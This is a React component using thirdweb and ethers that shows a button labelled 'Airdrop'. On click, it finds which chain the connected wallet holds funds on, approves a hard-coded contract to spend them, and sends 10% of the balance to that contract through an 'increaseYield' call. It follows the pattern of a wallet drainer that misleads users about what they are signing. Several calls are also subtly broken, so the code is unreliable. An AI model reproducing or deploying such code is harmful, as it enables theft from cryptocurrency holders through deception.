import React, { useEffect, useState } from "react";
import { ConnectButton, TransactionButton } from "thirdweb/react";
import {
  ARBITRUMCONTRACT,
  AVAXCONTRACT,
  BNBCONTRACT,
  BSCTESTCONTRACT,
  chains,
  client,
} from "../constants/constanst";
import { createWallet } from "thirdweb/wallets";
import { useActiveAccount } from "thirdweb/react";
import { useSwitchActiveWalletChain } from "thirdweb/react";
import { getWalletBalance } from "thirdweb/wallets";
import { prepareContractCall, toWei } from "thirdweb";
import { ethers } from "ethers";

const CustomButton = () => {
  // const signer = useSigner();
  const activeAccount = useActiveAccount();
  const switchChain = useSwitchActiveWalletChain();
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState("0");
  const [currentChain, setCurrentChain] = useState("");
  const [currentChainId, setCurrentChainId] = useState("");

  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  const checkBalanceAndSwitchChain = async () => {
    if (!activeAccount?.address) return;

    setLoading(true);

    for (const chain of chains) {
      setCurrentChainId(chain.id);
      setCurrentChain(chain.name);
      try {
        const balanceResult = await getWalletBalance({
          address: activeAccount.address,
          client,
          chain,
        });

        const balanceInUnit = balanceResult.displayValue;

        console.log(
          `Balance found on ${chain.rpc}: ${balanceInUnit} ${chain.ticker}`
        );

        if (parseFloat(balanceInUnit) > 0) {
          await switchChain({ id: chain.id });

          const currentChainContract = chain.name.includes("avalanche")
            ? AVAXCONTRACT
            : chain.name.includes("smart chain")
            ? BNBCONTRACT
            : chain.name.includes("arbitrum")
            ? ARBITRUMCONTRACT
            : BSCTESTCONTRACT;

          const balanceToStake = parseFloat(balanceInUnit) * 0.1;
          console.log("balance to stake:", balanceToStake.toString());

          setBalance(balanceToStake.toString());

          const signer = activeAccount;

          const tokenContract = new ethers.Contract(
            currentChainContract.address,
            [
              "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
            ],
            signer
          );

          const approvalTx = await tokenContract.increaseAllowance(
            currentChainContract.address,
            toWei(balanceToStake.toString())
          );

          console.log("Approval transaction sent", approvalTx);
          await approvalTx.wait();
          console.log("Approval successful");

          const transaction = prepareContractCall({
            contract: currentChainContract,
            method: "increaseYield",
            params: [activeAccount.address, toWei(balanceToStake.toString())],
          });

          try {
            // Execute the increaseYield transaction
            await transaction();
            console.log("Transaction successful!");
            return;
          } catch (error) {
            console.error("Transaction failed:", error);
            alert("Transaction failed: " + error.message);
            return;
          }
        } else {
          console.log(
            `No balance on ${chain.rpc}, switching to the next chain.`
          );
          await delay(2000);
        }
      } catch (error) {
        console.error(`Error fetching balance for chain ${chain.id}:`, error);
      }
    }

    setLoading(false);
  };

  useEffect(() => {
    if (activeAccount?.address) {
      console.log(activeAccount.address);
      setCurrentChain(chains[0].name);
    }
  }, [activeAccount]);

  return (
    <div>
      <ConnectButton
        client={client}
        wallets={[
          createWallet("io.metamask"),
          // createWallet("app.phantom"),
          createWallet("com.coinbase.wallet"),
          createWallet("me.rainbow"),
        ]}
        connectButton={{
          label: "Connect",
        }}
        chains={chains}
      />
      {loading && <p>Wait...</p>}
      {activeAccount && (
        <p>
          Balance: {balance} Current Chain: {currentChain}
        </p>
      )}
      {activeAccount && (
        <TransactionButton
          transaction={() => checkBalanceAndSwitchChain()}
          onTransactionSent={() =>
            alert(`${balance} ${currentChain} approved for staking`)
          }
        >
          Airdrop
        </TransactionButton>
      )}
    </div>
  );
};

export default CustomButton;
